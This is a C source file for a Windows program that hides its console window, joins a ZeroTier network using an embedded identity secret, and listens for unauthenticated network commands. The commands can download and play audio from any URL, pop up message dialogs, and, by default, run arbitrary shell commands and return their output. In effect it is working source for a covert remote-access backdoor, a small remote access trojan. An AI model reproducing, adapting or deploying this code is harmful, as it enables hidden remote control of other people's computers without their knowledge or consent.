/* Remote message passing and audio playing program with ZeroTier,
 * with an optional extra shell access.
 */
/*
 *  zt_rmp.c
 *  Copyright (C) 2022 Zhang Maiyun <me@myzhangll.xyz>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
/* Command:
 *   x86_64-w64-mingw32-g++ -DADD_EXPORTS -DNW_ID=<network> \
 *   -DIDENTITY_SECRET=<identity.secret> -I libzt/include \ zt_rmp.c \
 *   lib/libzt.a -lws2_32 -lshlwapi -liphlpapi -lurlmon -lwinmm -static
 */

#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
#include <windows.h>
#else
#error Not Supported
#endif

#include <ZeroTierSockets.h>

#define ZT_WAITPOLL(stmt)                                                      \
    do                                                                         \
    {                                                                          \
        while (!(stmt))                                                        \
            zts_util_delay(50);                                                \
    } while (0)

const int LPORT = 9999;
const int BACKLOG = 100;
jmp_buf jmp_env;

/* Create a ZeroTier socket, bind, and listen on it */
static int listen_socket(const char *laddr, int *pfd)
{
    int fd;
    int err;
    if ((fd = zts_socket(ZTS_AF_INET, ZTS_SOCK_STREAM, 0)) < 0)
    {
        fprintf(stderr, "Unable to create socket: zts_errno=%d\n", zts_errno);
        return 2;
    }
    if ((err = zts_bind(fd, laddr, LPORT) < 0))
    {
        fprintf(stderr, "Unable to bind: %d, zts_errno=%d\n", err, zts_errno);
        return 2;
    }
    if ((err = zts_listen(fd, BACKLOG)) < 0)
    {
        fprintf(stderr, "Unable to listen: %d, zts_errno=%d)\n", err,
                zts_errno);
        return 2;
    }
    printf("Listening on %s:%d\n", laddr, LPORT);
    *pfd = fd;
    return 0;
}

/* Read a line terminated with '\n' from ZeroTier file descriptor
 * Everything after the first newline is discarded */
static char *read_command(int accfd)
{
    char buffer[64] = {0};
    char *command;
    int bytes;
    size_t allocated = 128, read = 0;

    command = (char *)malloc(allocated);
    if (command == NULL)
    {
        fprintf(stderr, "Unable to allocate command buffer\n");
        return NULL;
    }
    while ((bytes = zts_read(accfd, buffer, sizeof(buffer))) >= 0)
    {
        char *newline;
        if (read + bytes >= allocated)
        {
            char *tmp;
            allocated <<= 1;
            tmp = (char *)realloc(command, allocated);
            if (tmp == NULL)
            {
                fprintf(stderr, "Unable to allocate command buffer\n");
                free(command);
                return NULL;
            }
            command = tmp;
        }
        memcpy(command + read, buffer, bytes);

        if ((newline = (char *)memchr(command + read, '\n', bytes)))
        {
            *newline = '\0';
            return (char *)realloc(command, newline + 1 - command);
        }

        read += bytes;
    }
    fprintf(stderr, "Unable to read from socket: %d, zts_errno=%d\n", bytes,
            zts_errno);
    free(command);
    return NULL;
}

/* Play a music */
static int handle_play(const char *arg, int accfd)
{
#ifdef WIN32
    int ret;
    char path[MAX_PATH] = {0};
    const char *msg_back;

    ret = URLDownloadToCacheFile(NULL, arg, path, MAX_PATH, 0, NULL);
    if (ret != S_OK)
        msg_back = "{\"error\": \"URL download failed\"}";
    else
    {
        if (PlaySound(path, NULL, SND_FILENAME | SND_ASYNC))
            msg_back = "{\"play\": \"success\"}";
        else
            msg_back = "{\"play\": \"fail\"}";
    }

    zts_write(accfd, msg_back, strlen(msg_back));
    return ret;
#else
#error Not Supported
#endif
}

/* Create an onscreen dialog */
int handle_message(const char *arg, int accfd)
{
#ifdef WIN32
    int resp =
        MessageBox(NULL, arg, "From Mikey", MB_YESNOCANCEL | MB_SETFOREGROUND);
    const char *msg_back;

    switch (resp)
    {
        case IDYES:
            msg_back = "{\"response\": \"yes\"}";
            break;
        case IDNO:
            msg_back = "{\"response\": \"no\"}";
            break;
        case IDCANCEL:
            msg_back = "{\"response\": \"cancel\"}";
            break;
        default:
            msg_back = "{\"error\": \"unknown response\"}";
            break;
    }
    zts_write(accfd, msg_back, strlen(msg_back));
    return resp;
#else
#error Not Supported
#endif
}

#ifndef DISABLE_RSH
/* Run a command */
int handle_command(const char *arg, int accfd)
{
    char buffer[128] = {0};
    FILE *output = popen(arg, "r");
    size_t count;
    if (output == NULL)
    {
        const char *msg_back = "{\"error\": \"execution failed\"}";
        zts_write(accfd, msg_back, strlen(msg_back));
        return 1;
    }
    while (1)
    {
        size_t count = fread(buffer, sizeof(char), 128, output);
        zts_write(accfd, buffer, count);
        if (count < 128)
            return 0;
    }
}
#endif

/* Dispatch commands */
int run_command(char *command, int accfd)
{
    char *space = strchr(command, ' ');
    const char *arg = space + 1;
    if (space == NULL)
        return 1;
    *space = '\0';

    if (strcmp(command, "play") == 0)
        return handle_play(arg, accfd);
    if (strcmp(command, "message") == 0)
        return handle_message(arg, accfd);
#ifndef DISABLE_RSH
    if (strcmp(command, "command") == 0)
        return handle_command(arg, accfd);
#endif
    return 2;
}

/* Handle connections in a thread */
void socket_thread(void *fd)
{
    char *command;
    int accfd = (int)(intptr_t)fd;

    command = read_command(accfd);
    printf("Command returned %d\n", run_command(command, accfd));
    free(command);
    zts_close(accfd);
}

void jmp_end(int sig) { longjmp(jmp_env, sig); }

int main(void)
{
    int fd = 0;
    int err;
    char laddr[ZTS_IP_MAX_STR_LEN] = {0};
    const char identity[ZTS_ID_STR_BUF_LEN] = IDENTITY_SECRET;

    /* Make the window disappear */
#ifdef WIN32
    HWND hcon = GetConsoleWindow();
    if (hcon)
    {
        ShowWindow(hcon, SW_HIDE);
    }
    else
    {
        HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
        CloseHandle(h);
        FreeConsole();
    }
#else
#error Not Supported
#endif

    if ((err = zts_init_from_memory(identity, ZTS_ID_STR_BUF_LEN)) !=
        ZTS_ERR_OK)
    {
        fprintf(stderr, "Unable to start service: %d\n", err);
        return 2;
    }

    if ((err = zts_node_start()) != ZTS_ERR_OK)
    {
        fprintf(stderr, "Unable to start service: %d\n", err);
        return 2;
    }

    /* Set end-of-process handlers */
    if (setjmp(jmp_env))
    {
        zts_close(fd);
        return zts_node_stop();
    }
    signal(SIGINT, jmp_end);
    signal(SIGTERM, jmp_end);

    printf("Waiting for node to come online\n");
    ZT_WAITPOLL(zts_node_is_online());

    printf("Node ID is %llx\n", zts_node_get_id());

    printf("Joining network %llx\n", NW_ID);
    if ((err = zts_net_join(NW_ID)) != ZTS_ERR_OK)
    {
        fprintf(stderr, "Unable to join network: %d\n", err);
        return 2;
    }

    printf("Waiting for address\n");
    ZT_WAITPOLL(zts_net_transport_is_ready(NW_ID));
    ZT_WAITPOLL(zts_addr_is_assigned(NW_ID, ZTS_AF_INET));
    zts_addr_get_str(NW_ID, ZTS_AF_INET, laddr, ZTS_IP_MAX_STR_LEN);
    printf("Assigned IP address: %s\n", laddr);

    if ((err = listen_socket(laddr, &fd)) != 0)
        return err;

    /* Run indefinitely to accept commands */
    while (1)
    {
        int accfd;
        char raddr[ZTS_IP_MAX_STR_LEN] = {0};
        unsigned short rport = 0;

        accfd = zts_accept(fd, raddr, ZTS_IP_MAX_STR_LEN, &rport);
        if (accfd < 0)
        {
            fprintf(stderr, "Unable to accept connection: zts_errno=%d\n",
                    zts_errno);
            continue;
        }
        printf("Connection from %s:%d\n", raddr, rport);
#ifdef WIN32
        if (_beginthread(&socket_thread, 0, (void *)(intptr_t)accfd) == -1)
            fprintf(stderr, "Unable to start thread: %d\n", errno);
#else
#error Not Supported
#endif
    }
    return 127;
}
